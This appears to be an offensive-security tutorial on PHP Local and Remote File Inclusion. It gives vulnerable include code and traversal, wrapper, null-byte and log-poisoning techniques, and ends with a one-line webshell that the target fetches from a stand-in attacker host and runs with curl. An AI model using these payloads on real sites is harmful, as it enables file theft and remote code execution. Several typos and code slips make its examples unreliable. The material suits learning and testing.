# LFI (Local File Inclusion)
This is a vulnerability tat allows an attacker to include files on a server through the webbrowser basically to read them, apart from the hosted web-root directory.

LFI is mostly caused when a developer is too lazy to write a secure code >.<

```php
<?php
	$file = $_GET['page'];
	if (isset($file)){
		include("pages/$file");
	} else {
		include("ingex.php");
	}
?>
```

That above is an example of a vulnerable LFI code.

### Identifying LFI vulnerabilities
Say you visit a website `http://example.com/index.php` and from the navigation bar you find `http://example.com/index.php?page=about.php`, An attacker can attempt to exploit this by trying LFI:

`http://example.com/index.php?page=about.php`
`http://example.com/index.php?page=../../../../../../../etc/passwd`

Where this will include the `/etc/passwd` file instead of `about.php`

### Wrappers (PHP)
Sometimes wrappers can be used in this case , but depends with if the wrapper you are to use is allowed or not.

***EXPECT***
This wrapper allows execution of system commands , unfortunately it is not enabled by default, it can be used as below:

`http://example.com/index.php?page=expect://ls`

And the output over here shall be the listing of the files inside the server from the pwd it was executed at

***INPUT***
This wrapper also allows system commands execution , it can be used as follows:

`curl -X POST "http://example.com/index.php?page=php://input&cmd=ls" -d <?php echo system($_GET['cmd'];);?>`

***FILTER***
Allows an attacker to include localfiles which are then encoded with base64 to be the output, thus an attacker will have to decode the base64 content to get the plain text content, here is an example:

`http://example.com/inedx.php?page=php://filter/convert.base64-encode/resource=/etc/passwd`

This will encode the `/etc/passwd` file in base64 then output it.

### Null Byte Technique Bypassing
Sometimes it is filtered thus you have to bypass the filter to be able to fully perform LFI , by this we can bypass the filters using Null byte injection bypasses where as we add URL encoded `NULL BYTES` such as `%00` , for example:

`http://example.com/index.php?page=/etc/passwd%00`

### LFI 2 RCE
There are plenty of ways to get RCE from LFI , among them is by performing Log poisoning where as you send a request with a shell snippet code and then access the log and add a parameter that will perform execution of system commands , and the other would be by poisoning mail logs , and as well as the `input` wrapper and the `expect` wrapper

# RFI (Remote File Inclusion)
This vulnerability is almost the same to LFI but this one is of course remote , so you can perform almost the same thing in LFI but by accessing a remote vendor saying the code is :

```php
<?php
	$file = $_REQUEST['file'];
	if (isset($file)){
		include($file.'php');
	} else {
		include('index.php');
	}
?>
```

This is just an example of what the code looks like , so basically what it does it just takes the `?page=` parameter with a page like `about` without the `.php` at the end and then it outputs it, so we can take advantage of this by hosting a malicious script from our server `malicious.com` and then host the malicious php webshell from it and then request it from the website that is vulnerable without the extension, the malicious script would in this case be:

```php
<?=`$_POST[0]`?>
```

Where it is taking the data `0` and then executing it with system command then outputing the result so we can host it and access it to the targetted site with curl simple by writing:

```bash
curl -X POST "http://example.com/index.php?page=http://malicious.com/evil" -d "0=ls"
```

We didn't write `evil.php` because it will say not found since it will be called as `evil.php.php` , instead I just wrote `evil` where it will then be called `evil.php`.

From there I can definitely get RCE

**By tahaafarooq**
